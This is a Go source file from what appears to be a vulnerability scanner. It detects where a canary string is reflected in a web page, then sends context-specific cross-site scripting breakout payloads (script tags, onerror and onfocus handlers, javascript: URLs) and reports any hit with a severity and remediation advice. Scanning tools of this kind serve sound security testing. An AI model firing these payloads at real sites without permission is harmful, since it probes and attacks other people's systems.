package xssengine

import (
	"DORM/models"
	"fmt"
	"net/http"
	"net/url"
	"strings"
)

// ============================================================
//  CONTEXT DETECTOR — Determines where the canary is reflected
//  HTML Tag · HTML Attribute · JS String · CSS · URL Context
// ============================================================

// ReflectionContext represents where a canary was found in the response.
type ReflectionContext int

const (
	ContextUnknown   ReflectionContext = iota
	ContextHTMLBody                    // Inside HTML tag body
	ContextHTMLAttr                    // Inside an HTML attribute value
	ContextJSString                    // Inside a JavaScript string
	ContextJSCode                      // Inside JavaScript code (not string)
	ContextCSS                         // Inside a CSS block
	ContextURL                         // Inside a URL (href/src)
	ContextComment                     // Inside an HTML/JS comment
)

// DetectContext analyzes the response body to determine the reflection context
// of the canary string.
func DetectContext(body, canary string) ReflectionContext {
	idx := strings.Index(body, canary)
	if idx == -1 {
		return ContextUnknown
	}

	// Get surrounding context (200 chars before and after)
	start := idx - 200
	if start < 0 {
		start = 0
	}
	end := idx + len(canary) + 200
	if end > len(body) {
		end = len(body)
	}
	context := body[start:end]
	before := body[start:idx]
	lower := strings.ToLower(context)
	beforeLower := strings.ToLower(before)

	// Check if inside HTML comment
	lastCommentOpen := strings.LastIndex(beforeLower, "<!--")
	lastCommentClose := strings.LastIndex(beforeLower, "-->")
	if lastCommentOpen > lastCommentClose {
		return ContextComment
	}

	// Check if inside a <script> block
	lastScriptOpen := strings.LastIndex(beforeLower, "<script")
	lastScriptClose := strings.LastIndex(beforeLower, "</script")
	if lastScriptOpen > lastScriptClose {
		// Inside <script> — determine if inside string or code
		lastQuote := strings.LastIndexAny(before, `"'`)
		if lastQuote > lastScriptOpen {
			return ContextJSString
		}
		return ContextJSCode
	}

	// Check if inside a <style> block
	lastStyleOpen := strings.LastIndex(beforeLower, "<style")
	lastStyleClose := strings.LastIndex(beforeLower, "</style")
	if lastStyleOpen > lastStyleClose {
		return ContextCSS
	}

	// Check if inside an HTML attribute
	lastOpenTag := strings.LastIndex(before, "<")
	lastCloseTag := strings.LastIndex(before, ">")
	if lastOpenTag > lastCloseTag {
		// We're inside an HTML tag — check if inside an attribute value
		tagContent := before[lastOpenTag:]
		lastEq := strings.LastIndex(tagContent, "=")
		if lastEq != -1 {
			afterEq := strings.TrimSpace(tagContent[lastEq+1:])
			if strings.HasPrefix(afterEq, `"`) || strings.HasPrefix(afterEq, `'`) {
				// Check if it's a URL attribute (href, src, action)
				attrCheck := strings.ToLower(tagContent)
				if strings.Contains(attrCheck, "href=") || strings.Contains(attrCheck, "src=") || strings.Contains(attrCheck, "action=") {
					return ContextURL
				}
				return ContextHTMLAttr
			}
		}
	}

	// Default: HTML body context
	_ = lower
	return ContextHTMLBody
}

// GetContextPayloads returns payloads specifically designed for the detected context.
func GetContextPayloads(ctx ReflectionContext, canary string) []string {
	switch ctx {
	case ContextHTMLBody:
		return []string{
			fmt.Sprintf(`<script>alert('%s')</script>`, canary),
			fmt.Sprintf(`<img src=x onerror=alert('%s')>`, canary),
			fmt.Sprintf(`<svg onload=alert('%s')>`, canary),
		}
	case ContextHTMLAttr:
		return []string{
			fmt.Sprintf(`" onmouseover="alert('%s')`, canary),
			fmt.Sprintf(`' onfocus='alert("%s")' autofocus='`, canary),
			fmt.Sprintf(`" autofocus onfocus="alert('%s')"`, canary),
			fmt.Sprintf(`"><script>alert('%s')</script>`, canary),
			fmt.Sprintf(`'><script>alert('%s')</script>`, canary),
		}
	case ContextJSString:
		return []string{
			fmt.Sprintf(`';alert('%s');//`, canary),
			fmt.Sprintf(`";alert('%s');//`, canary),
			fmt.Sprintf(`</script><script>alert('%s')</script>`, canary),
			fmt.Sprintf(`'-alert('%s')-'`, canary),
			fmt.Sprintf(`\';alert(\'%s\');//`, canary),
		}
	case ContextJSCode:
		return []string{
			fmt.Sprintf(`alert('%s')`, canary),
			fmt.Sprintf(`;alert('%s');//`, canary),
			fmt.Sprintf(`}alert('%s');//{`, canary),
		}
	case ContextCSS:
		return []string{
			fmt.Sprintf(`}</style><script>alert('%s')</script>`, canary),
			fmt.Sprintf(`expression(alert('%s'))`, canary),
		}
	case ContextURL:
		return []string{
			fmt.Sprintf(`javascript:alert('%s')`, canary),
			fmt.Sprintf(`data:text/html,<script>alert('%s')</script>`, canary),
			fmt.Sprintf(`" onfocus="alert('%s')" autofocus="`, canary),
		}
	case ContextComment:
		return []string{
			fmt.Sprintf(`--><script>alert('%s')</script><!--`, canary),
			fmt.Sprintf(`--><img src=x onerror=alert('%s')>`, canary),
		}
	}
	return nil
}

// RunContextAwareInjection performs context-aware XSS injection.
// First sends a canary to detect the reflection context, then sends
// context-specific payloads for higher accuracy.
func RunContextAwareInjection(client *http.Client, baseURL string, target models.ScanTarget, canary string, endpoints, params []string) *models.Vulnerability {
	for _, ep := range endpoints {
		for _, param := range params {
			// Step 1: Send canary and detect context
			probeURL := fmt.Sprintf("%s%s?%s=%s", baseURL, ep, param, url.QueryEscape(canary))
			resp, err := client.Get(probeURL)
			if err != nil {
				continue
			}
			body := models.ReadBody(resp, 32768)

			if !strings.Contains(body, canary) {
				continue
			}

			ctx := DetectContext(body, canary)
			if ctx == ContextUnknown {
				continue
			}

			// Step 2: Send context-specific payloads
			ctxPayloads := GetContextPayloads(ctx, canary)
			for _, payload := range ctxPayloads {
				targetURL := fmt.Sprintf("%s%s?%s=%s", baseURL, ep, param, url.QueryEscape(payload))
				resp2, err2 := client.Get(targetURL)
				if err2 != nil {
					continue
				}
				body2 := models.ReadBody(resp2, 32768)

				if strings.Contains(body2, canary) && ContainsXSSIndicator(body2) {
					contextName := contextToString(ctx)
					return &models.Vulnerability{
						Target:   target,
						Name:     fmt.Sprintf("Context-Aware XSS (%s Context)", contextName),
						Severity: "HIGH",
						CVSS:     8.0,
						Description: fmt.Sprintf(
							"XSS vulnerability detected using context-aware injection.\n\n"+
								"Reflection Context: %s\n"+
								"URL: %s\n"+
								"Parameter: %s\n"+
								"Payload: %s\n\n"+
								"The canary was reflected in a %s context, and a context-specific breakout payload was successful.",
							contextName, targetURL, param, payload, contextName,
						),
						Solution:  "Apply context-specific output encoding. HTML encode for HTML body, JavaScript encode for JS strings, URL encode for URL contexts.",
						Reference: "https://owasp.org/www-community/attacks/xss/",
					}
				}
			}
		}
	}
	return nil
}

func contextToString(ctx ReflectionContext) string {
	switch ctx {
	case ContextHTMLBody:
		return "HTML Body"
	case ContextHTMLAttr:
		return "HTML Attribute"
	case ContextJSString:
		return "JavaScript String"
	case ContextJSCode:
		return "JavaScript Code"
	case ContextCSS:
		return "CSS"
	case ContextURL:
		return "URL"
	case ContextComment:
		return "HTML Comment"
	}
	return "Unknown"
}
